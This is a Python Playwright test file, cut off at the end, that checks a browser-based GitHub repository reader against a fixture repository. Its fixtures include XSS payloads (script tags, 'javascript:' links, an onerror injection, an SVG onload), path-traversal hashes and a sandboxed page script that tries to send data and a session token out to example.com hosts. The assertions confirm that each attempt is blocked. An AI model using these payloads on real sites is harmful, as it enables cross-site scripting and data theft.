"""The reader at /symphony/door/ (assets/js/door.js, wired by initDoor in assets/js/symphony-panel.js),
run in a browser.

Playwright drives the preinstalled Chromium against the built page, served from this folder on
127.0.0.1, signed in with a token put in sessionStorage, with api.github.com stood in for by a
small fixture repository, so no request leaves the machine. Where Playwright or its browser is
absent, as on the site's CI, every test skips and says so.

Run: PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers python3 -m unittest discover -s tests -t .
"""

import base64
import functools
import http.server
import json
import re
import struct
import threading
import unittest
import zlib
from pathlib import Path
from urllib.parse import parse_qs, quote, unquote, urlsplit

ROOT = Path(__file__).resolve().parent.parent

try:
    from playwright.sync_api import Error as PlaywrightError, sync_playwright
except ImportError:  # the site's CI has no Playwright: the tests below skip
    sync_playwright = None
    PlaywrightError = Exception

REPO = "acme/reader-test"
TOKEN = "github_pat_TEST_NOT_A_REAL_TOKEN"
API = "https://api.github.com"
RAW = "application/vnd.github.raw+json"
TEXT_MATCH = "application/vnd.github.text-match+json"
SIGNIN = "symphony-signin.openspineconsortium.workers.dev"
SHAS = ["a" * 40, "b" * 40, "c" * 40]


def png_1x1():
    """A valid one-pixel PNG, so a picture test needs no file on disk."""
    def chunk(kind, data):
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)
    header = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", header) + chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00")) + chunk(b"IEND", b"")


README = """# Reader test

A fixture repository for the reader. <script>window.pwned = 1</script> stays text.

- [the guide](docs/guide.md)
- [up](../secret.md)
- [encoded](docs%2Fguide.md)
- [script](javascript:alert(1))
- [absolute](/docs/guide.md)
- [the page](artifacts/x/index.html)

![a dot](pictures/dot.png)
![a mark](pictures/mark.svg)
![x" onerror="window.pwned=2](pictures/dot.png)

<!-- a comment that is not shown -->

## Files

| name | kind |
|------|------|
| `big.bin` | too large |
"""

GUIDE = """# Guide

## Second part

Back [home](../README.md#reader-test), or open [the page](../artifacts/x/index.html#leave).
"""

# An exported page: it refers to files beside it, and its script tries every way out of the sealed
# frame and reports what happened to the page that holds it, which the tests read. Opened with the
# hash "leave" it also tries to navigate its frame away, which a page that read the repository
# could use to carry its text out in the address.
EXPORTED = """<!doctype html>
<html><head><meta charset="utf-8"><title>Exported</title>
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="//leak.example.com">
<link rel="preconnect" href="https://leak.example.com">
<link rel="stylesheet" href="style.css">
<script src="app.js"></script>
</head><body>
<h1 id="top">Exported page</h1>
<img id="pic" src="../../pictures/dot.png" alt="dot">
<p><a id="guide" href="../../docs/guide.md">guide</a> <a id="out" href="https://example.com/out">out</a></p>
<script>
(function () {
  function send(key, value) { parent.postMessage({type: 'test.report', key: key, value: String(value)}, '*'); }
  function ask(msg) {
    return new Promise(function (done) {
      var id = 'r' + Math.random();
      msg.id = id;
      function on(e) { if (e.data && e.data.id === id) { window.removeEventListener('message', on); done(e.data); } }
      window.addEventListener('message', on);
      parent.postMessage(msg, '*');
    });
  }
  window.addEventListener('message', function (e) {
    if (e.data && e.data.type === 'schwingnet.dispatch.result') send('dispatch', e.data.ok ? 'ran' : e.data.error);
  });
  fetch('https://example.com/').then(function () { send('fetch_outside', 'went'); }, function () { send('fetch_outside', 'blocked'); });
  fetch('data.json').then(function (r) { return r.json(); }).then(function (j) { send('fetch_beside', j && j.ok ? 'answered' : 'wrong'); }, function (e) { send('fetch_beside', 'failed ' + e); });
  ask({type: 'schwingnet.read', repo: 'acme/reader-test', ref: 'main', path: 'docs/guide.md'}).then(function (r) { send('read_own_ref', r.ok && /Guide/.test(r.text) ? 'answered' : 'refused ' + r.error); });
  ask({type: 'schwingnet.read', repo: 'acme/reader-test', ref: 'board', path: 'STATE.md'}).then(function (r) { send('read_other_ref', r.ok ? 'answered' : r.error); });
  ask({type: 'schwingnet.read', repo: 'acme/reader-test', ref: 'main', path: '../secret.md'}).then(function (r) { send('read_traversal', r.ok ? 'answered' : r.error); });
  ask({type: 'schwingnet.read', repo: 'other/repo', ref: 'main', path: 'README.md'}).then(function (r) { send('read_other_repo', r.ok ? 'answered' : r.error); });
  parent.postMessage({type: 'schwingnet.dispatch', label: 'go'}, '*');
  var img = new Image();
  img.onload = function () { send('img_outside', 'loaded'); };
  img.onerror = function () { send('img_outside', 'blocked'); };
  img.src = 'https://example.com/i.png';
  try { send('beacon', navigator.sendBeacon('https://example.com/b', 'x') ? 'queued' : 'refused'); } catch (e) { send('beacon', 'threw'); }
  try {
    var ws = new WebSocket('wss://example.com/ws');
    ws.onerror = function () { send('websocket', 'blocked'); };
    ws.onopen = function () { send('websocket', 'opened'); };
  } catch (e) { send('websocket', 'threw'); }
  try { send('storage', typeof sessionStorage.getItem('symphony_panel_token')); } catch (e) { send('storage', 'no access'); }
  try { send('opened', window.open('https://example.com/pop') ? 'opened' : 'refused'); } catch (e) { send('opened', 'threw'); }
  send('style', getComputedStyle(document.body).backgroundColor);
  send('app', window.appRan ? 'ran' : 'not run');
  send('origin', location.origin);
  send('rtc', typeof window.RTCPeerConnection === 'function' ? 'there' : 'none');

  // opened from the guide's link, the page's last act is to try to leave with what it read
  if (document.documentElement.getAttribute('data-hash') === 'leave') {
    setTimeout(function () { try { location.href = 'https://example.com/nav?took=' + encodeURIComponent(document.title); } catch (e) { /* nothing */ } }, 300);
  }
})();
</script>
</body></html>
"""

FILES = {
    "main": {
        "README.md": README.encode(),
        "docs/guide.md": GUIDE.encode(),
        "pictures/dot.png": png_1x1(),
        "pictures/mark.svg": b'<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" onload="parent.postMessage({type:\'svg-script\'},\'*\')"><circle cx="4" cy="4" r="3"/></svg>',
        "artifacts/x/index.html": EXPORTED.encode(),
        "artifacts/x/style.css": b"body { background: rgb(1, 2, 3); }",
        "artifacts/x/app.js": b"window.appRan = true;",
        "artifacts/x/data.json": b'{"ok": true}',
        "deep/inner/file.txt": b"a text file\n",
        "docs/anchors.md": b"# Anchors\n\n[go](#2-two--spaces)\n\n## 2. Two  spaces\n\ntext\n",
        "data.zip": b"PK\x03\x04" + b"\x00" * 96,
        ".github/symphony/door.json": json.dumps({"doors": [
            {"label": "Guide", "path": "docs/guide.md"},
            {"label": "Board", "path": "STATE.md", "ref": "board"},
            {"label": "Bad", "path": "../x"},
            {"label": "Also bad", "path": "docs", "ref": "../main"},
        ]}).encode(),
    },
    "board": {"STATE.md": b"# Board\n\nall quiet\n"},
}
# a file the listing shows as larger than the reader opens; its bytes are never asked for
LARGE = {"main": {"big.bin": 11 * 1024 * 1024}}
TYPES = {"md": "text/markdown", "png": "image/png", "svg": "image/svg+xml", "html": "text/html", "css": "text/css",
         "js": "text/javascript", "json": "application/json", "txt": "text/plain", "zip": "application/zip"}


def listing(ref, folder):
    """The contents API's answer for a folder: its direct entries, or None where there is none."""
    names = {}
    sizes = dict(FILES.get(ref, {}))
    for path, size in LARGE.get(ref, {}).items():
        sizes[path] = size
    prefix = folder + "/" if folder else ""
    for path, data in sizes.items():
        if not path.startswith(prefix):
            continue
        rest = path[len(prefix):]
        head = rest.split("/")[0]
        if "/" in rest:
            names[head] = ("dir", None)
        else:
            names[head] = ("file", data if isinstance(data, int) else len(data))
    if not names:
        return None
    out = []
    for name, (kind, size) in sorted(names.items()):
        path = prefix + name
        out.append({"type": kind, "name": name, "path": path, "size": size or 0,
                    "html_url": "https://github.com/%s/%s/%s/%s" % (REPO, "tree" if kind == "dir" else "blob", ref, path)})
    return out


class StandIn:
    """api.github.com, answered from the fixture; every request is recorded for the assertions."""

    def __init__(self):
        self.requests = []
        self.outside = []
        self.hold = set()       # raw reads of these paths are kept unanswered in held
        self.held = []
        self.fail_once = set()  # raw reads of these paths answer 502 the first time

    def handle(self, route, request):
        url = urlsplit(request.url)
        self.requests.append({"method": request.method, "path": url.path, "query": url.query,
                              "accept": request.headers.get("accept", ""), "auth": request.headers.get("authorization", "")})
        if request.method != "GET":
            return route.fulfill(status=405, content_type="application/json", body='{"message":"not a read"}')
        q = parse_qs(url.query)
        path = url.path
        if path == "/user":
            return self.json(route, {"login": "reader"})
        if path == "/repos/" + REPO:
            return self.json(route, {"full_name": REPO, "default_branch": "main", "private": True})
        if path == "/repos/" + REPO + "/commits":
            n = int(q.get("per_page", ["30"])[0])
            return self.json(route, [{"sha": s, "html_url": "https://github.com/%s/commit/%s" % (REPO, s),
                                      "author": {"login": "reader"},
                                      "commit": {"message": "Commit %d\n\nmore" % i, "committer": {"date": "2026-10-27T0%d:00:00Z" % i}}}
                                     for i, s in enumerate(SHAS[:n])])
        if path == "/search/code":
            items = [{"path": "docs/guide.md", "text_matches": [{"fragment": "## Second part"}]}] if "Second" in q.get("q", [""])[0] else []
            if request.headers.get("accept", "") != TEXT_MATCH:
                for it in items:
                    del it["text_matches"]
            return self.json(route, {"total_count": len(items), "items": items})
        m = re.match(r"^/repos/" + re.escape(REPO) + r"/contents/?(.*)$", path)
        if m:
            ref = q.get("ref", ["main"])[0]
            target = unquote(m.group(1)).rstrip("/")
            if target in FILES.get(ref, {}):
                data = FILES[ref][target]
                if "raw" in request.headers.get("accept", "") and target in self.fail_once:
                    self.fail_once.discard(target)
                    return route.fulfill(status=502, content_type="application/json", body='{"message":"Server Error"}')
                if "raw" in request.headers.get("accept", "") and target in self.hold:
                    self.held.append((route, data, TYPES.get(target.rsplit(".", 1)[-1], "application/octet-stream")))
                    return None
                if "raw" in request.headers.get("accept", ""):
                    return route.fulfill(status=200, content_type=TYPES.get(target.rsplit(".", 1)[-1], "application/octet-stream"), body=data)
                return self.json(route, {"type": "file", "name": target.split("/")[-1], "path": target, "size": len(data),
                                         "encoding": "base64", "content": base64.b64encode(data).decode()})
            if target in LARGE.get(ref, {}):
                return route.fulfill(status=500, content_type="text/plain", body="the reader must never ask for this file's bytes")
            entries = listing(ref, target)
            if entries is not None:
                return self.json(route, entries)
        return self.json(route, {"message": "Not Found"}, 404)

    def json(self, route, data, status=200):
        route.fulfill(status=status, content_type="application/json", body=json.dumps(data))

    def release(self):
        for route, data, kind in self.held:
            route.fulfill(status=200, content_type=kind, body=data)
        self.held = []

    def contents_paths(self):
        return [r["path"] + ("?" + r["query"] if r["query"] else "") for r in self.requests if "/contents" in r["path"]]


class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass


INIT = """
(function () {
  if (window !== window.top) return;
  var token = %s;
  if (token) try { sessionStorage.setItem('symphony_panel_token', token); } catch (e) { /* an opaque frame has no storage */ }
  window.__msgs = [];
  window.addEventListener('message', function (e) {
    try { window.__msgs.push(JSON.parse(JSON.stringify(e.data))); } catch (err) { /* not data */ }
  });
})();
"""


@unittest.skipIf(sync_playwright is None, "Playwright is not installed: pip install playwright, and point PLAYWRIGHT_BROWSERS_PATH at its browsers")
class Door(unittest.TestCase):
    """The page at /symphony/door/, signed in, against the fixture repository."""

    @classmethod
    def setUpClass(cls):
        cls.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), functools.partial(Quiet, directory=str(ROOT)))
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()
        cls.base = "http://127.0.0.1:%d" % cls.server.server_address[1]
        cls.play = sync_playwright().start()
        try:
            cls.browser = cls.play.chromium.launch()
        except PlaywrightError as e:
            cls.play.stop()
            cls.server.shutdown()
            cls.server.server_close()
            raise unittest.SkipTest("Chromium did not launch (set PLAYWRIGHT_BROWSERS_PATH to Playwright's browsers): " + str(e).splitlines()[0])

    @classmethod
    def tearDownClass(cls):
        if getattr(cls, "browser", None):
            cls.browser.close()
            cls.play.stop()
        cls.server.shutdown()
        cls.server.server_close()

    def setUp(self):
        self.api = StandIn()
        self.errors = []
        self.authorized = []
        self.start(TOKEN)

    def start(self, token):
        """A fresh browser context, signed in with the token given or, with none, signed out."""
        if getattr(self, "context", None):
            self.context.close()
        self.context = self.browser.new_context(viewport={"width": 1200, "height": 800})
        self.context.add_init_script(INIT % json.dumps(token))
        self.context.route("**/*", self.route)
        self.page = self.context.new_page()
        self.page.on("console", self.console)
        self.page.on("pageerror", lambda e: self.errors.append("pageerror: " + str(e)))

    def tearDown(self):
        self.context.close()

    def route(self, route, request):
        host = urlsplit(request.url).netloc
        if host == urlsplit(self.base).netloc:
            return route.continue_()
        if host == "api.github.com":
            return self.api.handle(route, request)
        if request.url.startswith("https://github.com/login/oauth/authorize?"):
            # GitHub's sign-in, answered as GitHub answers it: back to the callback with a code
            q = parse_qs(urlsplit(request.url).query)
            self.authorized.append(q)
            back = q["redirect_uri"][0] + "?code=CODE123&state=" + quote(q["state"][0])
            return route.fulfill(status=302, headers={"Location": back}, body="")
        if host == SIGNIN:
            body = {"access_token": "ghu_TEST_NOT_A_REAL_TOKEN", "token_type": "bearer", "expires_in": 28800,
                    "refresh_token": "ghr_TEST_NOT_A_REAL_TOKEN", "refresh_token_expires_in": 15811200, "scope": ""}
            return route.fulfill(status=200, content_type="application/json", headers={"Access-Control-Allow-Origin": "*"},
                                 body=json.dumps(body if urlsplit(request.url).path == "/exchange" else {}))
        self.api.outside.append(request.url)
        if host in ("fonts.googleapis.com", "fonts.gstatic.com"):
            return route.fulfill(status=200, content_type="text/css", body="")
        route.abort()

    def console(self, msg):
        # the sealed page's own attempts to leave are refused by its policy, which Chromium logs
        # from that frame, and a 404 the stand-in answers is logged by the browser as a failed
        # load; the page's own script must log nothing
        if msg.type not in ("error", "warning") or str(msg.location.get("url", "")).startswith("about:"):
            return
        if msg.text.startswith("Failed to load resource") or "Content Security Policy" in msg.text:
            return
        self.errors.append(msg.type + ": " + msg.text)

    def open(self, query="?repo=" + REPO, hash="", wait=True):
        """The page, signed in; by default it waits until the repository's crumbs show, which every
        view that opened draws first."""
        self.page.goto(self.base + "/symphony/door/" + query + hash)
        if wait:
            self.page.wait_for_selector("#door-where button:has-text('%s')" % REPO, timeout=15000)
            if not hash:
                self.page.wait_for_selector("#door-content .doc h1", timeout=15000)
        return self.page

    def pictures_loaded(self):
        """The README's two pictures, read when they come into view, so a count of requests taken
        after this is not moved by them."""
        self.page.wait_for_function("document.querySelector('#door-content img[alt=\"a dot\"]').src.startsWith('blob:')")
        self.page.wait_for_function("document.querySelector('#door-content img[alt=\"a mark\"]').src.startsWith('data:image/svg+xml;base64,')")

    def note(self):
        return self.page.inner_text("#door-note-text")

    def reports(self):
        return {m["key"]: m["value"] for m in self.page.evaluate("window.__msgs") if m and m.get("type") == "test.report"}

    # the README, its links and its pictures

    def test_the_readme_renders_and_a_relative_link_opens(self):
        page = self.open()
        self.assertEqual(page.inner_text("#door-content .doc h1"), "Reader test")
        self.assertIn(REPO, page.inner_text("#door-where"))
        self.assertEqual(page.input_value("#door-repo"), REPO)
        self.assertEqual(page.inner_text("#door-head")[:6], "main a")
        page.click("#door-content .doc a:has-text('the guide')")
        page.wait_for_selector("#door-content .doc h1:has-text('Guide')")
        self.assertTrue(page.url.endswith("#docs~guide.md"), page.url)
        page.click("#door-content .doc a:has-text('home')")
        page.wait_for_selector("#door-content .doc h1:has-text('Reader test')")
        self.assertFalse(page.is_disabled("#door-back"))
        self.assertEqual(self.errors, [])

    def test_raw_html_and_odd_links_in_a_document_run_nothing(self):
        page = self.open()
        self.assertIsNone(page.evaluate("window.pwned"))
        self.assertIn("<script>window.pwned = 1</script>", page.inner_text("#door-content .doc p"))
        gone = page.locator("#door-content .doc span.gone")
        self.assertEqual(gone.all_inner_texts(), ["up", "encoded"])
        self.assertEqual(page.locator("#door-content .doc a[href^='javascript']").count(), 0)
        self.assertEqual(page.locator("#door-content [onerror], #door-content [onload]").count(), 0)
        self.assertEqual(page.locator("#door-content .doc a:has-text('script')").count(), 0)
        page.click("#door-content .doc a:has-text('absolute')")
        page.wait_for_selector("#door-content .doc h1:has-text('Guide')")
        self.assertEqual(self.errors, [])

    def test_a_picture_shows_as_blob_and_an_svg_as_data(self):
        page = self.open()
        self.pictures_loaded()
        self.assertNotIn({"type": "svg-script"}, page.evaluate("window.__msgs"))
        page.goto(self.base + "/symphony/door/?repo=" + REPO + "#pictures~dot.png")
        page.wait_for_selector("#door-content img.picture")
        self.assertTrue(page.get_attribute("#door-content img.picture", "src").startswith("blob:"))
        self.assertEqual(self.errors, [])

    # the other views

    def test_changes_and_find_render_and_the_board_reads_its_branch(self):
        page = self.open()
        page.click("#door-changes")
        page.wait_for_selector("#door-content ul.commits li")
        self.assertEqual(page.locator("#door-content ul.commits li").count(), 3)
        self.assertEqual(page.inner_text("#door-content ul.commits li a.sha"), "aaaaaaa")
        self.assertTrue(page.url.endswith("#changes"))
        page.fill("#door-q", "Second part")
        page.click("#door-find button")
        page.wait_for_selector("#door-content ul.hits li")
        self.assertIn("Second part", page.inner_text("#door-content ul.hits li pre"))
        searches = [r for r in self.api.requests if r["path"] == "/search/code"]
        self.assertEqual(len(searches), 1)
        self.assertEqual(searches[0]["accept"], TEXT_MATCH)
        self.assertIn("q=repo%3Aacme%2Freader-test+Second+part", searches[0]["query"].replace("%20", "+"))
        page.click("#door-side button:has-text('Board')")
        page.wait_for_selector("#door-content .doc h1:has-text('Board')")
        self.assertIn("all quiet", page.inner_text("#door-content .doc"))
        self.assertTrue(page.url.endswith("#board"))
        self.assertIn("/repos/acme/reader-test/contents/STATE.md?ref=board", self.api.contents_paths())
        self.assertEqual(page.locator("#door-side button:has-text('Bad')").count(), 0)
        self.assertEqual(self.errors, [])

    def test_a_nested_folder_a_text_file_a_binary_and_a_large_file(self):
        page = self.open(hash="#deep~inner")
        page.wait_for_selector("#door-content ul.entries button:has-text('file.txt')")
        page.click("#door-content ul.entries button:has-text('file.txt')")
        page.wait_for_selector("#door-content pre code")
        self.assertEqual(page.inner_text("#door-content pre code"), "a text file\n")
        page.goto(self.base + "/symphony/door/?repo=" + REPO + "#data.zip")
        page.wait_for_selector("#door-content a:has-text('Open it on GitHub')")
        self.assertIn("is a binary file", page.inner_text("#door-content"))
        page.goto(self.base + "/symphony/door/?repo=" + REPO + "#big.bin")
        page.wait_for_selector("#door-content a:has-text('Open it on GitHub')")
        self.assertIn("more than this reader opens", page.inner_text("#door-content"))
        asked = [p for p in self.api.contents_paths() if "big.bin" in p or "data.zip" in p]
        self.assertEqual(asked, [], "the reader asked for bytes it must not: %s" % asked)
        self.assertEqual(self.errors, [])

    # what is not there

    def test_a_missing_path_and_an_unreadable_repository_say_so(self):
        page = self.open(hash="#nope~missing.md", wait=False)
        page.wait_for_selector("#door-note-text:has-text('That is not in the repository')")
        self.assertIn("main: nope/missing.md", page.inner_text("#door-note-more"))
        page.goto(self.base + "/symphony/door/?repo=acme/nope")
        page.wait_for_selector("#door-note-text:has-text('cannot read this repository, or the path is not there')")
        self.assertIn("404", page.inner_text("#door-note-more"))
        self.assertEqual([r["path"] for r in self.api.requests if r["path"].startswith("/repos/acme/nope")], ["/repos/acme/nope"])
        self.assertEqual(self.errors, [])

    def test_the_repository_comes_from_the_address_or_the_form(self):
        page = self.open(query="", wait=False)
        page.wait_for_selector("#door-note-text:has-text('Choose a repository above')")
        page.fill("#door-name", REPO)
        page.click("#door-pick button[type=submit]")
        page.wait_for_selector("#door-content .doc h1:has-text('Reader test')")
        self.assertIn("?repo=" + REPO, page.url)
        page.fill("#door-name", "not a repository")
        page.click("#door-pick button[type=submit]")
        page.wait_for_selector("#msg p:has-text('Name the repository as OWNER/NAME')")
        self.assertEqual(self.errors, [])

    def test_a_remembered_repository_opens_only_when_chosen(self):
        # the control panel's list and choice are offered, never opened unasked: the address names
        # what is open, so a link copied from the page opens the same thing for whoever it is sent to
        self.context.add_init_script("try { localStorage.setItem('symphony_panel_repos', JSON.stringify(['%s', 'other/repo'])); "
                                     "localStorage.setItem('symphony_panel_repo', '%s'); } catch (e) {}" % (REPO, REPO))
        page = self.open(query="", hash="#docs~guide.md", wait=False)
        page.wait_for_selector("#door-note-text:has-text('Choose a repository above')")
        page.wait_for_timeout(300)
        self.assertEqual([r["path"] for r in self.api.requests if r["path"].startswith("/repos/")], [])
        self.assertEqual(page.eval_on_selector("#door-repo", "s => s.value"), "")
        page.select_option("#door-repo", REPO)
        page.wait_for_selector("#door-content .doc h1:has-text('Reader test')")
        self.assertTrue(page.url.endswith("/symphony/door/?repo=" + REPO), page.url)
        self.assertEqual(self.errors, [])

    def test_a_deep_link_survives_the_first_sign_in(self):
        self.start(None)
        page = self.page
        page.goto(self.base + "/symphony/door/?repo=" + REPO + "#docs~guide.md")
        page.wait_for_selector("#cp-signin:visible")
        page.click("#cp-signin")
        page.wait_for_selector("#door-content .doc h1:has-text('Guide')", timeout=15000)
        self.assertEqual(len(self.authorized), 1)
        self.assertEqual(self.authorized[0]["redirect_uri"], [self.base + "/symphony/door/"])
        self.assertTrue(page.url.endswith("/symphony/door/?repo=" + REPO + "#docs~guide.md"), page.url)
        self.assertNotIn("code=", page.url)
        self.assertEqual(self.errors, [])

    # opening one thing after another

    def test_a_slow_read_never_lands_over_a_later_open(self):
        page = self.open()
        self.api.hold.add("docs/guide.md")
        page.click("#door-content a:has-text('the guide')")
        page.wait_for_function("() => document.querySelector('#door-busy') && !document.querySelector('#door-busy').hidden")
        page.wait_for_timeout(300)
        page.click("#door-home")
        page.wait_for_selector("#door-content ul.entries button:has-text('docs')")
        self.api.hold.clear()
        self.api.release()
        page.wait_for_timeout(500)
        self.assertEqual(page.locator("#door-content .doc h1:has-text('Guide')").count(), 0)
        self.assertNotIn("guide", page.inner_text("#door-where"))
        self.assertNotIn("#docs~guide.md", page.url)
        self.assertEqual(self.errors, [])

    def test_a_passing_failure_is_tried_once_more(self):
        self.api.fail_once.add("docs/guide.md")
        page = self.open(hash="#docs~guide.md", wait=False)
        page.wait_for_selector("#door-content .doc h1:has-text('Guide')", timeout=15000)
        reads = [p for p in self.api.contents_paths() if p.startswith("/repos/%s/contents/docs/guide.md" % REPO)]
        self.assertGreaterEqual(len(reads), 2)
        self.assertEqual(self.errors, [])

    def test_a_failed_open_puts_back_the_address_of_what_is_shown(self):
        page = self.open(hash="#docs~guide.md")
        page.wait_for_selector("#door-content .doc h1:has-text('Guide')")
        page.evaluate("location.hash = '#nothing.md'")
        page.wait_for_selector("#door-note-text:has-text('That is not in the repository')")
        page.wait_for_function("location.hash === '#docs~guide.md'")
        self.assertEqual(self.errors, [])

    def test_a_folder_written_with_a_separator_at_either_end_opens(self):
        for h in ("#docs~", "#docs/", "#~docs"):
            page = self.open(hash=h, wait=False)
            page.wait_for_selector("#door-content ul.entries button:has-text('guide.md')")
            self.assertTrue(page.url.endswith("#docs"), page.url)
        self.assertEqual(self.errors, [])

    def test_the_search_stays_in_the_repository(self):
        page = self.open()
        page.fill("#door-q", "repo:other/secret Second")
        page.click("#door-find button")
        page.wait_for_selector("#door-note-text:has-text('looks in this repository only')")
        self.assertEqual([r for r in self.api.requests if r["path"] == "/search/code"], [])
        page.fill("#door-q", "Second " + "x" * 190)
        page.click("#door-find button")
        page.wait_for_selector("#door-where:has-text('Search:')")
        sent = [r for r in self.api.requests if r["path"] == "/search/code"]
        self.assertEqual(len(sent), 1)
        self.assertLessEqual(len(parse_qs(sent[0]["query"])["q"][0]), 256)
        self.assertEqual(self.errors, [])

    def test_a_mistyped_repository_in_the_address_is_said_or_mended(self):
        page = self.open(query="?repo=" + REPO + "/", hash="#docs~guide.md", wait=False)
        page.wait_for_selector("#door-content .doc h1:has-text('Guide')")
        self.assertTrue(page.url.endswith("?repo=" + REPO + "#docs~guide.md"), page.url)
        page.goto(self.base + "/symphony/door/?repo=" + quote("not a repo <b>x</b>"))
        page.wait_for_selector("#door-note-text:has-text('which is not OWNER/NAME')")
        self.assertEqual(page.locator("#msg b").count(), 0)
        self.assertEqual(self.errors, [])

    def test_a_document_anchor_written_for_github_is_found(self):
        page = self.open(hash="#docs~anchors.md")
        page.wait_for_selector("#door-content .doc h2")
        self.assertEqual(page.locator("#doc-2-two--spaces").count(), 1)
        self.assertEqual(self.errors, [])

    def test_a_sealed_page_has_no_webrtc(self):
        page = self.open(hash="#artifacts~x~index.html")
        page.wait_for_function("window.__msgs.some(m => m && m.type === 'test.report' && m.key === 'rtc')", timeout=20000)
        self.assertEqual(self.reports()["rtc"], "none")

    # the sealed page

    def test_a_sealed_page_is_sandboxed_sealed_and_answered(self):
        page = self.open(hash="#artifacts~x~index.html")
        frame = page.wait_for_selector("#door-view.framed iframe")
        self.assertEqual(frame.get_attribute("sandbox"), "allow-scripts")
        self.assertEqual(frame.get_attribute("title"), "index.html")
        srcdoc = frame.get_attribute("srcdoc")
        self.assertRegex(srcdoc, r"^<!doctype html>\n<html[^>]*><head><meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; ")
        self.assertIn("connect-src 'none'", srcdoc)
        self.assertRegex(srcdoc, r"<head><meta http-equiv=\"Content-Security-Policy\" content=\"[^\"]*\"><meta http-equiv=\"x-dns-prefetch-control\" content=\"off\">")
        self.assertNotIn('content="on"', srcdoc)
        self.assertNotIn("leak.example.com", srcdoc)
        self.assertNotIn('<link rel="stylesheet"', srcdoc)
        self.assertNotIn('src="app.js"', srcdoc)
        self.assertIn("data:image/png;base64,", srcdoc)
        page.wait_for_function("Object.keys(window.__msgs.filter(m => m && m.type === 'test.report').reduce((o, m) => (o[m.key] = 1, o), {})).length >= 15", timeout=20000)
        page.wait_for_timeout(500)
        got = self.reports()
        reached = [u for u in self.api.outside if "example.com" in u]
        self.assertEqual(reached, [], "a sealed page reached outside: %s" % reached)
        self.assertEqual(got["fetch_outside"], "blocked")
        self.assertEqual(got["fetch_beside"], "answered")
        self.assertEqual(got["read_own_ref"], "answered")
        self.assertEqual(got["read_other_ref"], "ref not allowed")
        self.assertEqual(got["read_traversal"], "path not allowed")
        self.assertEqual(got["read_other_repo"], "repository not allowed")
        self.assertEqual(got["dispatch"], "not available here")
        self.assertEqual(got["img_outside"], "blocked")
        # Chromium answers true for a beacon its policy refuses, as it would for a network failure,
        # so the proof is the empty list of requests outside, above
        self.assertIn(got["beacon"], ("refused", "threw", "queued"))
        self.assertIn(got["websocket"], ("blocked", "threw"))
        self.assertEqual(got["storage"], "no access")
        self.assertEqual(got["opened"], "refused")
        self.assertEqual(got["style"], "rgb(1, 2, 3)")
        self.assertEqual(got["app"], "ran")
        self.assertEqual(got["origin"], "null")
        self.assertEqual(page.locator("#door-view.framed iframe").count(), 1)
        self.assertEqual(self.errors, [])

    def test_a_sealed_page_opens_links_through_the_reader(self):
        page = self.open(hash="#artifacts~x~index.html")
        page.wait_for_selector("#door-view.framed iframe")
        page.frame_locator("#door-view iframe").locator("#out").click()
        page.wait_for_selector("#door-note-text:has-text('outside the repository')")
        self.assertEqual(page.get_attribute("#door-note-more a", "href"), "https://example.com/out")
        self.assertEqual(page.get_attribute("#door-note-more a", "rel"), "noopener noreferrer")
        page.click("#door-note-do button:has-text('Close')")
        page.wait_for_selector("#door-note", state="hidden")
        page.frame_locator("#door-view iframe").locator("#guide").click()
        page.wait_for_selector("#door-content .doc h1:has-text('Guide')")
        self.assertEqual(page.locator("#door-view iframe").count(), 0)
        self.assertEqual([u for u in self.api.outside if "example.com" in u], [])
        self.assertEqual(self.errors, [])

    def test_a_sealed_page_cannot_navigate_its_frame_away(self):
        page = self.open(hash="#docs~guide.md")
        page.click("#door-content .doc a:has-text('the page')")
        page.wait_for_selector("#door-view.framed iframe")
        self.assertIn('data-hash="leave"', page.get_attribute("#door-view iframe", "srcdoc"))
        page.wait_for_function("window.__msgs.some(m => m && m.type === 'test.report' && m.key === 'origin')")
        page.wait_for_timeout(1500)
        reached = [u for u in self.api.outside if "example.com" in u]
        self.assertEqual(reached, [], "a sealed page carried something out in its address: %s" % reached)
        self.assertEqual([f.url for f in page.frames if "example.com" in f.url], [])

    # addresses that try to leave the repository

    def test_odd_hashes_and_links_send_nothing_outside_the_contents(self):
        page = self.open()
        self.pictures_loaded()
        before = len(self.api.requests)
        for h in ("#..~x", "#%2e%2e~x", "#docs%2Fguide.md", "#docs~~x", "#~~docs", "#.~docs", "#docs~.", "#a%00b", "#%zz"):
            page.evaluate("h => { location.hash = h; }", h)
            page.wait_for_selector("#door-note-text:has-text('names no path this reader opens')")
            page.evaluate("document.getElementById('door-note-text').textContent = ''")
        self.assertEqual(self.api.requests[before:], [], "a refused address still sent a request")
        bad = []
        for r in self.api.requests:
            if r["path"] in ("/user", "/search/code") or r["path"] == "/repos/" + REPO or r["path"] == "/repos/" + REPO + "/commits":
                continue
            if not r["path"].startswith("/repos/" + REPO + "/contents/"):
                bad.append(r["path"])
                continue
            rest = r["path"][len("/repos/" + REPO + "/contents/"):]
            if re.search(r"%2e|%2f|%5c|\\", rest, re.I) or any(s in ("", ".", "..") for s in rest.split("/") if rest):
                bad.append(r["path"])
        self.assertEqual(bad, [])
        self.assertEqual(self.errors, [])

    # the page itself

    def test_no_horizontal_scroll_on_a_phone(self):
        self.page.set_viewport_size({"width": 400, "height": 800})
        page = self.open()
        self.assertTrue(page.is_visible("#door-files"))
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), page.evaluate("document.documentElement.clientWidth"))
        page.click("#door-files")
        self.assertEqual(page.get_attribute("#door-files", "aria-expanded"), "true")
        self.assertTrue(page.is_visible("#door-side"))
        page.click("#door-side button:has-text('Guide')")
        page.wait_for_selector("#door-content .doc h1:has-text('Guide')")
        self.assertEqual(page.get_attribute("#door-files", "aria-expanded"), "false")
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), page.evaluate("document.documentElement.clientWidth"))
        self.assertEqual(self.errors, [])

    def test_forgetting_the_token_closes_the_reader(self):
